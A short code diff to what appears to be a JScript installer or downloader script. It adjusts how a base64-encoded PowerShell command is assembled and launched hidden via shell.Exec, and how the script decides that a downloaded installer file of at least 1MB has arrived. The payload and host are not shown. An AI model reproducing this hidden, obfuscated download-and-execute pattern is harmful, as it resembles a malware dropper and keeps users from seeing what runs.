@@ -530,7 +530,7 @@ function fallbackPS() {
         }
       }
     } catch (e2) {}
-    var cmd = b64Decode(PSX_B64).replace(/\s+$/, "") + b64EncodeU16(body);
+    var cmd = b64Decode(PSX_B64) + b64EncodeU16(body);   // prefix ends with a space
     var ex = shell.Exec(cmd, 0);   // hidden; returns the child process
     try { psPid = ex ? ex.ProcessID : 0; } catch (e3) { psPid = 0; }
     traceLog("predl: exec launched pid=" + psPid);
@@ -590,7 +590,10 @@ function _pollFallback() {
     if (dlStage === "exec") {
       var doneFlag = false;
       try { doneFlag = fso.FileExists(psDir + "\\done.flag"); } catch (e) {}
-      if (doneFlag && (t - psT0 > 10000 || sz < 1048576)) {
+      if (doneFlag && t - psT0 > 5000) {
+        // helper finished: a >=1MB file means the download landed (verify
+        // re-checks it); anything smaller means it failed.
+        if (sz >= 1048576) { settle("exec"); return; }
         fail("Failed to save the installer file", "predl: exec done no file sz=" + sz);
         return;
       }
